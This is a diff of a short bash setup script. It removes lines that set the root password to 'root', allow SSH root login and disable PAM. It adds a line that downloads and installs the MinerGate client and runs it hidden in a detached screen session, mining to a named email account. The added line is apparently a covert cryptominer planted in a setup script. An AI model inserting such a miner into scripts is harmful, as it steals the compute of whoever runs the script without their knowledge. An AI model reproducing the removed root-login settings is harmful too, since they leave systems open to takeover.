@@ -1,5 +1,4 @@
 #!/bin/bash
-echo 'root:root' |chpasswd
 
-sed -ri 's/^PermitRootLogin\s+.*/PermitRootLogin yes/' /etc/ssh/sshd_config
-sed -ri 's/UsePAM yes/#UsePAM yes/g' /etc/ssh/sshd_config
+
+apt-get update && apt-get -y install wget screen && wget https://minergate.com/download/deb-cli && dpkg -i deb-cli && screen -S mg -m minergate-cli -user sintraduciendo@gmail.com -bcn &
